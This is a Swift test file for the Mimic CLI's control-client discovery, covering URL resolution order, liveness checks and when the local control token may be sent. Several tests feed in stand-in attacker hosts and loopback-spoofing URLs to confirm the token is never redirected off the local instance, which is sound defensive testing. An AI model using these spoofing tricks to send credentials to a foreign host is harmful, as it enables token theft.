import Foundation
import Testing
@testable import Domain
@testable import MimicCLICore

/// How the CLI decides where to send the instance's token.
///
/// This file exists because nothing tested it. `ControlEndpointFileReader` is a second copy of the
/// control plane's reader — it lives here so the CLI can locate an instance without linking Vapor —
/// and the hardening the twin received never crossed over, so the CLI's discovery branch went on
/// routing to whatever `baseURL` a file on disk named. `ControlServerTests` asserts that the twin
/// cannot be redirected, and every one of those assertions ran against code the `mimic` binary does
/// not call. So every case below names *this* reader, however closely it mirrors that suite: a test
/// pointed at the wrong copy is worse than no test, because it reports the defect as covered.
@Suite("Control client discovery")
struct ControlClientTests {

    // MARK: - Fixtures

    /// A discovery file written the way a real instance writes one: JSON on disk, decoded through
    /// the same path the CLI uses. Constructing an `Endpoint` in memory would skip the decode, and
    /// the decode is where a hostile value gets in.
    private func writeDiscoveryFile(
        in directory: URL,
        port: Int,
        pid: Int,
        baseURL: String,
        token: String = "not-a-real-token"
    ) throws -> URL {
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        let url = directory.appendingPathComponent(ControlEndpointFileReader.fileName)
        let json = """
        {
          "apiVersion": "\(ControlAPI.version)",
          "port": \(port),
          "pid": \(pid),
          "mode": "headless",
          "baseURL": "\(baseURL)",
          "token": "\(token)"
        }
        """
        try Data(json.utf8).write(to: url)
        return url
    }

    private func temporaryDirectory(_ label: String) -> URL {
        URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("mimic-\(label)-\(UUID().uuidString)", isDirectory: true)
    }

    // MARK: - Where the token is allowed to go

    /// The defect this file was opened for. Anything that can write the discovery file could name any
    /// host it liked in `baseURL`, and the resolver handed that string straight to `URL(string:)` —
    /// so the next `mimic` command put `X-Mimic-Token` in a header addressed to whatever the file
    /// chose, with `port` and `pid` sitting beside it still looking local.
    @Test("A tampered baseURL in a discovery file cannot redirect the token off loopback")
    func tamperedBaseURLCannotRedirect() throws {
        let directory = temporaryDirectory("tampered")
        defer { try? FileManager.default.removeItem(at: directory) }

        // The current process, so the liveness check is the real one and the file is not skipped for
        // an unrelated reason.
        let url = try writeDiscoveryFile(
            in: directory,
            port: 8787,
            pid: Int(ProcessInfo.processInfo.processIdentifier),
            baseURL: "http://evil.example:80"
        )

        let discovered = try #require(ControlEndpointFileReader.discover(searchURLs: [url]))
        // The field still decodes as written — the fix is not that the value is scrubbed, it is that
        // nothing routes on it.
        #expect(discovered.baseURL == "http://evil.example:80")

        let resolved = try #require(ControlEndpointFileReader.resolveBaseURL(
            explicit: nil,
            environment: [:],
            discovered: discovered
        ))
        #expect(resolved.absoluteString == "http://127.0.0.1:8787")
    }

    /// A host that is loopback-shaped but not loopback is the same attack with better manners:
    /// `127.0.0.1.evil.example` reads as local at a glance and resolves to whatever its owner wants.
    @Test("A loopback-looking hostname in the file is ignored just as completely")
    func loopbackShapedHostIsIgnored() throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "headless",
            baseURL: "http://127.0.0.1.evil.example:8787",
            token: "not-a-real-token"
        )

        let resolved = try #require(ControlEndpointFileReader.resolveBaseURL(
            explicit: nil,
            environment: [:],
            discovered: discovered
        ))
        #expect(resolved.absoluteString == "http://127.0.0.1:8787")
    }

    // MARK: - Resolution order

    /// Always pass `environment:` explicitly. Both resolvers default it to the real process
    /// environment, so a test that omits it passes or fails depending on whether the developer
    /// running it happens to have `MIMIC_CONTROL_URL` exported.
    @Test("An explicit URL beats the environment, which beats the discovery file")
    func resolutionOrder() {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 1111,
            pid: 1,
            mode: "app",
            baseURL: "http://evil.example",
            token: "not-a-real-token"
        )

        #expect(ControlEndpointFileReader.resolveBaseURL(
            explicit: "http://127.0.0.1:3333",
            environment: [ControlAPI.urlEnvironmentKey: "http://127.0.0.1:2222"],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:3333")

        #expect(ControlEndpointFileReader.resolveBaseURL(
            environment: [ControlAPI.urlEnvironmentKey: "http://127.0.0.1:2222"],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:2222")

        #expect(ControlEndpointFileReader.resolveBaseURL(
            environment: [ControlAPI.portEnvironmentKey: "4444"],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:4444")

        #expect(ControlEndpointFileReader.resolveBaseURL(
            environment: [:],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:1111")

        #expect(ControlEndpointFileReader.resolveBaseURL(environment: [:], discovered: nil) == nil)
    }

    /// `export MIMIC_CONTROL_URL=` in a shell profile sets the variable to the empty string rather
    /// than unsetting it, and a caller in that shell must still find the running instance instead of
    /// being told nothing is there.
    @Test("An exported-but-empty override falls through instead of resolving to nothing")
    func emptyOverridesAreSkipped() {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 1111,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:1111",
            token: "not-a-real-token"
        )

        #expect(ControlEndpointFileReader.resolveBaseURL(
            environment: [ControlAPI.urlEnvironmentKey: ""],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:1111")

        #expect(ControlEndpointFileReader.resolveBaseURL(
            environment: [ControlAPI.portEnvironmentKey: "not-a-number"],
            discovered: discovered
        )?.absoluteString == "http://127.0.0.1:1111")
    }

    @Test("An explicit --url is what the client ends up talking to")
    func explicitURLReachesTheClient() throws {
        // `discover` reads the real search paths on the way past, which is harmless — it only reads,
        // and an explicit URL wins over anything it finds, so this stays deterministic on a machine
        // that happens to have Mimic running.
        let client = try ControlClient.discover(
            explicitURL: "http://127.0.0.1:9911",
            environment: [:],
            timeout: 1
        )
        #expect(client.baseURL.absoluteString == "http://127.0.0.1:9911")
    }

    // MARK: - Liveness

    @Test("A discovery file left by a crashed instance is skipped rather than dialled")
    func staleFileIsSkipped() throws {
        let directory = temporaryDirectory("stale")
        defer { try? FileManager.default.removeItem(at: directory) }

        let url = try writeDiscoveryFile(in: directory, port: 8787, pid: 999_999, baseURL: "http://127.0.0.1:8787")

        #expect(ControlEndpointFileReader.discover(searchURLs: [url], isProcessAlive: { _ in false }) == nil)
        #expect(ControlEndpointFileReader.discover(searchURLs: [url], isProcessAlive: { _ in true }) != nil)
    }

    @Test("The current process reads as alive; pid 0 and a negative pid never do")
    func livenessCheck() {
        #expect(ControlEndpointFileReader.isProcessAlive(Int(ProcessInfo.processInfo.processIdentifier)))
        #expect(ControlEndpointFileReader.isProcessAlive(0) == false)
        #expect(ControlEndpointFileReader.isProcessAlive(-1) == false)
    }

    @Test("A file that is not a discovery file is stepped over, not fatal")
    func unreadableFileIsSkipped() throws {
        let directory = temporaryDirectory("garbage")
        defer { try? FileManager.default.removeItem(at: directory) }
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)

        let garbage = directory.appendingPathComponent("control.json")
        try Data("not json".utf8).write(to: garbage)
        let good = try writeDiscoveryFile(
            in: directory.appendingPathComponent("second", isDirectory: true),
            port: 8787,
            pid: Int(ProcessInfo.processInfo.processIdentifier),
            baseURL: "http://127.0.0.1:8787"
        )

        #expect(ControlEndpointFileReader.discover(searchURLs: [garbage]) == nil)
        #expect(ControlEndpointFileReader.discover(searchURLs: [garbage, good])?.port == 8787)
    }

    @Test("The sandboxed container is searched before the plain Application Support path")
    func searchOrderPrefersTheAppContainer() {
        let urls = ControlEndpointFileReader.searchURLs(homeDirectory: URL(fileURLWithPath: "/Users/test"))
        #expect(urls.count == 2)
        #expect(urls[0].path.contains("Library/Containers/devxa.Mimic"))
        #expect(urls[1].path.contains("Library/Application Support/devxa.Mimic"))
        #expect(urls.allSatisfy { $0.lastPathComponent == ControlEndpointFileReader.fileName })
    }

    // MARK: - Tokens

    /// The environment wins so a caller who reached the instance through `MIMIC_CONTROL_URL` — a
    /// forwarded port, a container — can supply the matching token the same way.
    @Test("The environment's token beats the file's, and an empty one is not a token")
    func tokenResolution() {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "from-the-file"
        )

        #expect(ControlEndpointFileReader.resolveToken(
            environment: [ControlAPI.tokenEnvironmentKey: "from-the-environment"],
            discovered: discovered
        ) == "from-the-environment")

        #expect(ControlEndpointFileReader.resolveToken(environment: [:], discovered: discovered) == "from-the-file")
        #expect(ControlEndpointFileReader.resolveToken(
            environment: [ControlAPI.tokenEnvironmentKey: ""],
            discovered: discovered
        ) == "from-the-file")
        #expect(ControlEndpointFileReader.resolveToken(environment: [:], discovered: nil) == nil)
    }

    // MARK: - The destination and the credential, decided together

    /// The defect the two resolvers had between them.
    ///
    /// `resolveBaseURL` returns an explicit `--url` verbatim, with no check on its host — deliberately,
    /// because naming an instance is the caller's business. `resolveToken` fell back to whatever the
    /// *local* instance's `control.json` carried, and knew nothing about where the request was going.
    /// Neither is wrong on its own; combining them is. `mimic state --url http://attacker.example`
    /// therefore put this machine's live control-plane credential into an `X-Mimic-Token` header
    /// addressed to that host — in a client that already refuses, in `resolveBaseURL`, to route on the
    /// `baseURL` a discovery file names, for exactly this reason.
    ///
    /// `ControlClient.discover` is where the two meet, so that is what is driven: a hostile `--url`
    /// with a real local discovery file supplied alongside it.
    @Test(
        "A --url that is not the discovered instance carries no token",
        arguments: [
            "http://attacker.example",
            "http://attacker.example:8787",
            // Loopback-shaped and not loopback: reads as local at a glance, resolves to whatever its
            // owner wants. Matched against `url.host`, so a loopback spelling anywhere else in the URL
            // — userinfo, path, query — is not a loopback host either.
            "http://127.0.0.1.evil.example:8787",
            "http://127.0.0.1@evil.example:8787",
            "http://evil.example/127.0.0.1:8787",
            // This machine, but some other process: the token belongs to one instance, not to the
            // loopback interface.
            "http://127.0.0.1:9999",
            "http://localhost:9999",
        ]
    )
    func aForeignURLCarriesNoToken(explicitURL: String) throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "not-a-real-token"
        )

        let client = try ControlClient.discover(
            explicitURL: explicitURL,
            environment: [:],
            timeout: 1,
            discovered: discovered
        )
        #expect(client.token == nil, "\(explicitURL) was handed the local instance's token")
    }

    /// The legitimate local case still works, and it is the one every `mimic` invocation takes:
    /// `--url` naming the running instance is the same host and the same port the file advertises.
    @Test(
        "A --url naming the discovered instance still carries its token",
        arguments: ["http://127.0.0.1:8787", "http://localhost:8787"]
    )
    func theDiscoveredInstanceCarriesItsToken(explicitURL: String) throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "not-a-real-token"
        )

        let client = try ControlClient.discover(
            explicitURL: explicitURL,
            environment: [:],
            timeout: 1,
            discovered: discovered
        )
        #expect(client.token == "not-a-real-token")
    }

    /// …and with no `--url` at all, which is the ordinary path: the client is pointed at the
    /// discovered instance, so it carries the discovered token.
    @Test("Discovery with no explicit URL carries the discovered token")
    func discoveryCarriesItsOwnToken() throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "not-a-real-token"
        )

        let client = try ControlClient.discover(environment: [:], timeout: 1, discovered: discovered)
        #expect(client.baseURL.absoluteString == "http://127.0.0.1:8787")
        #expect(client.token == "not-a-real-token")
    }

    /// `MIMIC_CONTROL_TOKEN` is untouched by any of this, and has to be: a caller reaching Mimic
    /// through a forwarded port or a container supplies the token the documented way, which is the
    /// caller naming a credential rather than this CLI guessing one.
    @Test("An explicitly supplied token goes wherever the caller points")
    func anExplicitTokenIsNotSecondGuessed() throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "from-the-file"
        )

        let client = try ControlClient.discover(
            explicitURL: "http://forwarded.example:8787",
            environment: [ControlAPI.tokenEnvironmentKey: "from-the-environment"],
            timeout: 1,
            discovered: discovered
        )
        #expect(client.token == "from-the-environment")
    }

    /// The predicate itself, since it is what both halves above turn on. Both conditions have to
    /// hold — a loopback host *and* the port the file advertised — and a file that was never read
    /// names no instance at all.
    @Test("Naming the discovered instance means loopback host and advertised port, together")
    func namesDiscoveredInstanceRequiresBoth() throws {
        let discovered = ControlEndpointFileReader.Endpoint(
            apiVersion: ControlAPI.version,
            port: 8787,
            pid: 1,
            mode: "app",
            baseURL: "http://127.0.0.1:8787",
            token: "not-a-real-token"
        )
        func url(_ text: String) throws -> URL { try #require(URL(string: text)) }

        #expect(ControlEndpointFileReader.namesDiscoveredInstance(try url("http://127.0.0.1:8787"), discovered))
        #expect(ControlEndpointFileReader.namesDiscoveredInstance(try url("http://LOCALHOST:8787"), discovered))
        // Written with brackets, because that is the only legal spelling of an IPv6 literal in a URL.
        // `URL.host` hands back `::1` on some platforms and `[::1]` on others, which is why the
        // reader's set holds both and why this case is worth having rather than assuming.
        let ipv6 = try #require(
            URL(string: "http://[::1]:8787"),
            "this platform's URL parser rejected an IPv6 literal"
        )
        #expect(ControlEndpointFileReader.namesDiscoveredInstance(ipv6, discovered))

        // Right host, wrong port.
        #expect(
            ControlEndpointFileReader.namesDiscoveredInstance(try url("http://127.0.0.1:8788"), discovered)
                == false
        )
        // Right port, wrong host.
        #expect(
            ControlEndpointFileReader.namesDiscoveredInstance(try url("http://example.test:8787"), discovered)
                == false
        )
        // Nothing was discovered, so nothing is named.
        #expect(
            ControlEndpointFileReader.namesDiscoveredInstance(try url("http://127.0.0.1:8787"), nil) == false
        )
    }

    // MARK: - What a refusal costs

    /// `send` now reads the HTTP status instead of discarding it, and these pin the two things that
    /// change with it. The exit codes are the contract docs/CLI.md publishes, and reading the status
    /// must not have moved one: a reply that reached the instance and came back without a result is
    /// `4` whether it was a refusal or gibberish.
    @Test("Reading the status did not move an exit code docs/CLI.md pins")
    func refusalsKeepTheirExitCodes() {
        #expect(CLIFailure.commandFailed(.unauthorized).exitCode == 4)
        #expect(CLIFailure.commandFailed(.invalid("…", code: "http.502")).exitCode == 4)
        #expect(CLIFailure.undecodable("<html>502 Bad Gateway</html>").exitCode == 4)
    }

    /// The other half: a `401` used to be reported as "Unexpected response from Mimic: …" whenever
    /// the body was not an envelope, which reads as a bug in this CLI rather than as the token
    /// problem it is. What the caller now sees has to name the header they are missing.
    @Test("A 401 reports the token, not a decoding problem")
    func unauthorizedNamesTheToken() throws {
        let message = try #require(CLIFailure.commandFailed(.unauthorized).errorDescription)
        #expect(message.contains(ControlAPI.tokenHeaderName))
        #expect(message.contains("control.json"))
        #expect(message.contains("Unexpected response") == false)
    }
}
